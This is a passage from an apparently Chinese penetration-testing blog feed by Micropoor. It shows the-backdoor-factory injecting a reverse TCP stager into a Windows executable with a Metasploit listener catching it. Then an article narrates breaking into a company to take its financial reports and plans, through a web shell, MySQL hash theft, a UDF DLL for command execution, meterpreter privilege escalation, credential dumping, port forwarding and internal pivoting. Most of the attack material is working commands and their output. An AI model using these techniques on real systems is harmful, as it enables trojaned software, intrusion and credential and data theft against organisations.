class="line">//测试裂缝空间size150</span><br><span class="line">```  </span><br><span class="line">![](../do/media/2b8e42c3fe1195f37bf7b01fb31af21b.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/the-backdoor-factory# ./backdoor.py -f ~/demo/guobang.exe -s show</span><br><span class="line">//查看可用payload</span><br><span class="line">```  </span><br><span class="line">![](../do/media/c576aabd967bcbbf39467dcf40ec2759.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/the-backdoor-factory# ./backdoor.py -f ~/demo/guobang.exe -H 192.168.1.111 -P 8080 -s iat_reverse_tcp_stager_threaded</span><br><span class="line">//插入payload，并生成文件。</span><br><span class="line">```  </span><br><span class="line">![](../do/media/1dbc7c753b5135a67db8ac3bee6f3352.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/the-backdoor-factory# md5sum ./guobang.exe /root/demo/guobang.exe</span><br><span class="line">//对比原文件与生成文件MD5值</span><br><span class="line">```  </span><br><span class="line">![](../do/media/999c8d02e798b61f61a4d8cd284ffd0b.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/the-backdoor-factory# du -k ./guobang.exe /root/demo/guobang.exe</span><br><span class="line">//对比文件大小</span><br><span class="line">```  </span><br><span class="line">![](../do/media/edd13750f6b3e03121e63e805b4a5b97.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.111</span><br><span class="line">lhost =&gt; 192.168.1.111</span><br><span class="line">msf exploit(handler) &gt; set lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf exploit(handler) &gt; exploit -j </span><br><span class="line">//开启本地监听</span><br><span class="line">```  </span><br><span class="line">![](../do/media/94330fb03737c7e42549f1b9b3a8bb21.jpg)</span><br><span class="line"></span><br><span class="line">//打开软件  </span><br><span class="line">![](../do/media/2139e4a1c0c1e326605cf246742ff3a5.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: John-PC\John</span><br></pre></td></tr></table></figure><p>//确定目标  </p><p><img src="../do/media/613afd4b9343cfd43965aa934b71cc48.jpg" alt></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8、模拟诉求任务攻击</title>
      <link href="/article/8_%E6%A8%A1%E6%8B%9F%E8%AF%89%E6%B1%82%E4%BB%BB%E5%8A%A1%E6%94%BB%E5%87%BB.html"/>
      <url>/article/8_%E6%A8%A1%E6%8B%9F%E8%AF%89%E6%B1%82%E4%BB%BB%E5%8A%A1%E6%94%BB%E5%87%BB.html</url>
      
        <content type="html"><![CDATA[<h1 id="模拟诉求任务攻击"><a href="#模拟诉求任务攻击" class="headerlink" title="模拟诉求任务攻击"></a>模拟诉求任务攻击</h1><h2 id="模拟任务："><a href="#模拟任务：" class="headerlink" title="模拟任务："></a>模拟任务：</h2><p>拿到该公司明年计划，拿到该公司今年报表，并且摸清该公司组织架构。盈利情况。</p><h3 id="1、主站-Shell"><a href="#1、主站-Shell" class="headerlink" title="1、主站 Shell"></a>1、主站 Shell</h3><p>第一个shell为目标主站shell，为08 R2，提权后遂改变主意。由于是以APT为主，并不打算以主站权限为点渗透，动作太大。不利于长期跟踪。改变为搜集情报为主。配合下一步工作。  </p><p><img src="../do/media/746b8e7d82cbc4a1fdfac3456a8858c6.jpg" alt>  </p><p>主站为2008 R2:  </p><p><img src="../do/media/e15310a75e294cf4f5c16229a247812c.jpg" alt>  </p><p>主站端口为:  </p><p><img src="../do/media/f6268dd0a332a740852ed3c09b3c5bfa.jpg" alt></p><h3 id="2、信息搜集"><a href="#2、信息搜集" class="headerlink" title="2、信息搜集"></a>2、信息搜集</h3><p>搜集端口为该公司的其他分站提供下一步探测。</p><ul><li>进程搜集：红色为重点搜集源</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&gt;   D:\&gt; tasklist</span><br><span class="line"></span><br><span class="line">映像名稱 PID 工作階段名稱 工作階段 # RAM使用量</span><br><span class="line"></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process 0 0 24 K</span><br><span class="line">System 4 0 372 K</span><br><span class="line">smss.exe 296 0 1,448 K</span><br><span class="line">csrss.exe 400 0 6,968 K</span><br><span class="line">wininit.exe 452 0 5,636 K</span><br><span class="line">csrss.exe 460 1 12,460 K</span><br><span class="line">winlogon.exe 496 1 6,484 K</span><br><span class="line">services.exe 556 0 10,392 K</span><br><span class="line">lsass.exe 572 0 22,076 K</span><br><span class="line">lsm.exe 584 0 7,104 K</span><br><span class="line">svchost.exe 676 0 10,840 K</span><br><span class="line">svchost.exe 760 0 9,492 K</span><br><span class="line">LogonUI.exe 852 1 19,632 K</span><br><span class="line">svchost.exe 864 0 21,188 K</span><br><span class="line">svchost.exe 904 0 34,904 K</span><br><span class="line">svchost.exe 944 0 13,476 K</span><br><span class="line">svchost.exe 996 0 13,512 K</span><br><span class="line">svchost.exe 168 0 19,480 K</span><br><span class="line">svchost.exe 648 0 12,348 K</span><br><span class="line">spoolsv.exe 1080 0 16,672 K</span><br><span class="line">armsvc.exe 1124 0 4,208 K</span><br><span class="line">apnmcp.exe 1172 0 5,832 K</span><br><span class="line">svchost.exe 1196 0 9,228 K</span><br><span class="line">aspnet_state.exe 1224 0 8,264 K</span><br><span class="line">FileZilla Server.exe 1344 0 7,876 K</span><br><span class="line">svchost.exe 1380 0 10,408 K</span><br><span class="line">inetinfo.exe 1412 0 31,680 K</span><br><span class="line">EngineServer.exe 1448 0 568 K</span><br><span class="line">FrameworkService.exe 1548 0 19,580 K</span><br><span class="line">VsTskMgr.exe 1612 0 1,724 K</span><br><span class="line">MDM.EXE 1680 0 6,652 K</span><br><span class="line">naPrdMgr.exe 1692 0 2,116 K</span><br><span class="line">mfevtps.exe 1720 0 992 K</span><br><span class="line">sqlservr.exe 1760 0 13,284 K</span><br><span class="line">svchost.exe 1844 0 3,452 K</span><br><span class="line">snmp.exe 1868 0 9,264 K</span><br><span class="line">sqlwriter.exe 1904 0 7,440 K</span><br><span class="line">vmtoolsd.exe 1976 0 17,012 K</span><br><span class="line">snmp.exe 1988 0 3,164 K</span><br><span class="line">conhost.exe 1996 0 4,784 K</span><br><span class="line">vmware-converter-a.exe 2068 0 31,460 K</span><br><span class="line">vmware-converter.exe 2180 0 38,176 K</span><br><span class="line">vmware-converter.exe 2228 0 32,828 K</span><br><span class="line">svchost.exe 2288 0 14,152 K</span><br><span class="line">McShield.exe 2320 0 89,332 K</span><br><span class="line">mfeann.exe 2468 0 5,860 K</span><br><span class="line">conhost.exe 2476 0 3,380 K</span><br><span class="line">w3wp.exe 2592 0 160,760 K</span><br><span class="line">w3wp.exe 2812 0 463,872 K</span><br><span class="line">svchost.exe 3452 0 9,656 K</span><br><span class="line">svchost.exe 4104 0 6,384 K</span><br><span class="line">dllhost.exe 4252 0 12,192 K</span><br><span class="line">msdtc.exe 4424 0 8,708 K</span><br><span class="line">svchost.exe 4196 0 34,760 K</span><br><span class="line">w3wp.exe 5604 0 12,632 K</span><br><span class="line">TrustedInstaller.exe 4500 0 11,788 K</span><br><span class="line">cmd.exe 6292 0 3,932 K</span><br><span class="line">conhost.exe 6384 0 4,476 K</span><br><span class="line">tasklist.exe 1496 0 6,064 K</span><br><span class="line">WmiPrvSE.exe 5508 0 7,272 K</span><br></pre></td></tr></table></figure><ul><li><p>账户搜集：（已处理）<br><img src="../do/media/717681fc6cc9bf99ce2e08d1269bf520.jpg" alt></p></li><li><p>重要路径搜集：<br>（无图，路径搜集为未来可能需要dump file做准备）</p></li><li><p>数据库密码搜集：<br>（无图，密码搜集为未来可能需要碰撞做准备）</p></li><li><p>杀毒软件搜集： 强力的麦咖啡</p></li><li><p>管理员习惯搜集：<br>（无图，尽量避免与admin的fvsf）（面对面的vs是不是这么拼写？）</p></li><li><p>其他搜集：<br>（由于是第一个shell，具体的已经忘记了）</p></li></ul><h3 id="3、第二台服务器权限"><a href="#3、第二台服务器权限" class="headerlink" title="3、第二台服务器权限"></a>3、第二台服务器权限</h3><p>第二台服务器权限：window x86 2003  </p><p>根据上一台的服务器情报搜集很快得到了一台win03<br><img src="../do/media/e9c1ae09ef37846c5585efce53581daa.jpg" alt><br><img src="../do/media/925237f336d2f19420dbded16fb9fc93.jpg" alt>  </p><ul><li>IP .3<br><img src="../do/media/ded2f1377655e8467db234c432e8a51f.jpg" alt></li></ul><p>为一台开发机。目标仅支持 asp，无其他脚本支持。但是服务器中安装有 mysql，php 等。并且无 asp to mysql Device Drive IIS 配置中也并不支持 php。msf 反弹后，继续搜集情报。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\MySQL\MySQL Server 5.0\data\mysql\user.MYD</span><br></pre></td></tr></table></figure><p>得到 root hash</p><p>在实际情况中，交互的shell下运行 <code>mysql -uroot -pxxx</code> 无法继续交互，需要参数 e 解决这个问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into a (cmd) values (hex(load_file(&apos;C:\\xxxx\\xxxx.dll&apos;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM a INTO DUMPFILE</span><br><span class="line"> &apos;c:\\windows\\system32\\xxxx.dll&apos;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &apos;udf.dll&apos;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&apos;cmd&apos;,&apos;C:\\xxxx\\xxx\\xxxxx.exe&apos;);&quot;</span><br></pre></td></tr></table></figure><p><img src="../do/media/0778524b132d34c4e9ac2bdeb4f5ff26.jpg" alt></p><p><strong>如果限制上传大小同样可以hex解决上传大小问题。</strong></p><h3 id="4、msf-操作实例"><a href="#4、msf-操作实例" class="headerlink" title="4、msf 操作实例"></a>4、msf 操作实例</h3><p>以下为部分msf操作实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; exploit -l</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">PID PPID Name Arch Session User Path</span><br><span class="line">--- ---- ---- ---- ------- ---- ----</span><br><span class="line"></span><br><span class="line">0 0 [System Process]</span><br><span class="line">4 0 System x86 0 NT AUTHORITY\SYSTEM</span><br><span class="line">304 4 smss.exe x86 0 NT AUTHORITY\SYSTEM\SystemRoot\System32\smss.exe</span><br><span class="line">352 304 csrss.exe x86 0 NT AUTHORITY\SYSTEM \?? \C:\WINDOWS\system32\csrss.exe</span><br><span class="line">376 304 winlogon.exe x86 0 NT AUTHORITY\SYSTEM \?? \C:\WINDOWS\system32\winlogon.exe</span><br><span class="line">424 376 services.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe</span><br><span class="line">436 376 lsass.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe</span><br><span class="line">620 424 vmacthlp.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmacthlp.exe</span><br><span class="line">636 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\svchost.exe</span><br><span class="line">708 424 svchost.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">768 424 svchost.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">812 424 svchost.exe x86 0 NT AUTHORITY\LOCAL SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">828 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">1000 424 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe</span><br><span class="line">1028 424 msdtc.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\msdtc.exe</span><br><span class="line">1160 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">1228 424 inetinfo.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\inetsrv\inetinfo.exe</span><br><span class="line">1252 424 sqlservr.exe x86 0 NT AUTHORITY\SYSTEM C:\PROGRA\~1\MICROS~1\MSSQL\binn\sqlservr.exe</span><br><span class="line">1304 424 mysqld.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\MySQL\MySQL Server 5.1\bin\mysqld.exe</span><br><span class="line">1348 424 svchost.exe x86 0 NT AUTHORITY\LOCAL SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">1408 424 vmtoolsd.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line">1472 424 mssearch.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\Common Files\System\MSSearch\Bin\mssearch.exe</span><br><span class="line">1720 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">2128 2084 explorer.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\Explorer.EXE</span><br><span class="line">2208 2128 vmtoolsd.exe x86 0 xxxxxxxxxxxx\Administrator C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line">2232 2128 ctfmon.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\ctfmon.exe</span><br><span class="line">2244 2128 sqlmangr.exe x86 0 xxxxxxxxxxxx\Administrator C:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exe</span><br><span class="line">2396 424 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">2440 424 dllhost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\dllhost.exe</span><br><span class="line">3008 2128 cmd.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\cmd.exe</span><br><span class="line">3024 3008 conime.exe x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\conime.exe</span><br><span class="line">3180 636 wmiprvse.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\wbem\wmiprvse.exe</span><br><span class="line">3248 828 wuauclt.exe xxxxxxxxxxxx\Administrator C:\WINDOWS\system32\wuauclt.exe</span><br><span class="line">3380 376 logon.scr x86 0 xxxxxxxxxxxx\Administrator C:\WINDOWS\System32\logon.scr</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 2128</span><br><span class="line">[*] Migrating from 3104 to 2128...</span><br><span class="line">[*] Migration completed successfully. meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM meterpreter &gt; msv</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving msv credentials msv credentials</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">AuthID Package Domain User Password</span><br><span class="line">------ ------- ------ ---- --------</span><br><span class="line"></span><br><span class="line">0;109205 NTLM xxxxxxxxxxxx Administrator lm&#123; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;, ntlm&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &#125;</span><br><span class="line">0;996 Negotiate NT AUTHORITY NETWORK SERVICE lm&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &#125;, ntlm&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &#125;</span><br><span class="line">0;997 Negotiate NT AUTHORITY LOCAL SERVICE n.s. (Credentials KO)</span><br><span class="line">0;54469 NTLM n.s. (Credentials KO)</span><br><span class="line">0;999 NTLM WORKGROUP xxxxxxxxxxxx\$ n.s. (Credentials KO)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kerberos [+] Running as SYSTEM</span><br><span class="line"></span><br><span class="line">[*] Retrieving kerberos credentials kerberos credentials</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">AuthID Package Domain User Password</span><br><span class="line">------ ------- ------ ---- --------</span><br><span class="line"></span><br><span class="line">0;996 Negotiate NT AUTHORITY NETWORK SERVICE</span><br><span class="line">0;997 Negotiate NT AUTHORITY LOCAL SERVICE</span><br><span class="line">0;54469 NTLM</span><br><span class="line">0;999 NTLM WORKGROUP xxxxxxxxxxxx$</span><br><span class="line">0;109205 NTLM xxxxxxxxxxxx Administrator 123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -r x.x.x.x -p 3389 #IP已做处理</span><br><span class="line">[*] Local TCP relay created: :3389 &lt;-&gt; x.x.x.x:3389</span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Index Local Remote Direction</span><br><span class="line">----- ----- ------ ---------</span><br><span class="line">1 0.0.0.0:3389 x.x.x.x:3389 Forward</span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">root@xxxx:/# rdesktop 127.0.0.1:3389 Autoselected keyboard map en-us</span><br><span class="line">Failed to negotiate protocol, retrying with plain RDP.</span><br><span class="line">WARNING: Remote desktop does not support colour depth 24; falling back to 16</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[*] Usage: run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*] run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to</span><br><span class="line">10.10.10.1/255.255.255.0</span><br><span class="line">[*] run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*] run autoroute -s 10.10.10.1/24 # CIDR notation is also okay</span><br><span class="line">[*] run autoroute -p # Print active routing table</span><br><span class="line">[*] run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/windows/manage/autoroute module</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface 1</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line">Name : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line"></span><br><span class="line">Interface 2</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Name : Broadcom NetXtreme Gigabit Ethernet - McAfee NDIS Intermediate Filter Miniport</span><br><span class="line">Hardware MAC : 00:11:25:40:77:8f</span><br><span class="line">MTU : 1500</span><br><span class="line">IPv4 Address : 10.23.255.3 IPv4 Netmask : 255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s 10.23.255.3 -n 255.255.255.0</span><br><span class="line"></span><br><span class="line">[*] Adding a route to 10.23.255.3/255.255.255.0...</span><br><span class="line">[+] Added route to 10.23.255.3/255.255.255.0 via 61.57.243.227</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Subnet Netmask Gateway</span><br><span class="line">------ ------- -------</span><br><span class="line">10.23.255.3 255.255.255.0 Session 3</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface 1</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Name : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line"></span><br><span class="line">Interface 2</span><br><span class="line"></span><br><span class="line">============</span><br><span class="line">Name : Broadcom NetXtreme Gigabit Ethernet - McAfee NDIS Intermediate Filter Miniport</span><br><span class="line">Hardware MAC : 00:11:25:40:77:8f</span><br><span class="line">MTU : 1500</span><br><span class="line">IPv4 Address : 10.23.255.3 IPv4 Netmask : 255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">Background session 3? [y/N]</span><br><span class="line"></span><br><span class="line">msf auxiliary(tcp) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(tcp) &gt; show options</span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line"></span><br><span class="line">CONCURRENCY 10 yes The number of concurrent ports to check per host</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in milliseconds</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">PORTS 445,80,3389,22 yes Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">RHOSTS 10.23.255.1-255 yes The target address range or CIDR identifier</span><br><span class="line">THREADS 10 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 1000 yes The socket connect timeout in milliseconds</span><br></pre></td></tr></table></figure><p>最终得到了域控权限，并且得到了跨段的服务器权限。得到了个人机的重要权限，以及公司财报doc。  </p><p>部分截图如下：由于时间问题，顺序可能打乱了。<br><img src="../do/media/d9c285d8edbf94e604d4e2f92fe63815.jpg" alt></p><p><img src="../do/media/824a5aaac67fa081fad56b2ca579832e.jpg" alt></p><p><img src="../do/media/c9f9fb2244552c5a3dca3568004ed092.jpg" alt></p><p><img src="../do/media/3e0d25dfde3a692f2a49b094dfb71725.jpg" alt></p><p>跳段， 个人机<br><img src="../do/media/89c46d141a5ffbd22831f3075eedf393.jpg" alt></p><p><img src="../do/media/4ea97efa8ad35910d41c147a7e6eb006.jpg" alt></p><p>放弃权限，所有操作并未更改，下载，删除等一切损害该公司的行为。<br><img src="../do/media/7f7f09e6ec2f6f8860b6700befeea075.jpg" alt></p><p>至此由虚拟机跳段到了工作办公机，（典型的A-B-C类跳板）得到了该公司的下年计划，人员组织构架，财务报表，盈利情况，以及内部相关work文档等。</p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7、sqlServer常用操作远程桌面语句</title>
      <link href="/article/7_sqlServer%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AF%AD%E5%8F%A5.html"/>
      <url>/article/7_sqlServer%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AF%AD%E5%8F%A5.html</url>
      
